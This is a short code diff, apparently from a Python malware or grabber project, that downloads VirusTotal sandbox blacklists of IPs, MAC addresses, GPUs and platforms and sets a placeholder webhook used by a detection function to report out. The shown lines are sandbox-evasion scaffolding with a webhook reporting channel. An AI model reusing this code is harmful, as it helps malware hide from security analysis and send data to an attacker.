@@ -151,7 +151,7 @@ iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-black
 maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
 gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
 platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
-api = ""
+api = "webhook here"
 
 def vtdetect():
     webhooksend = Webhook(api)
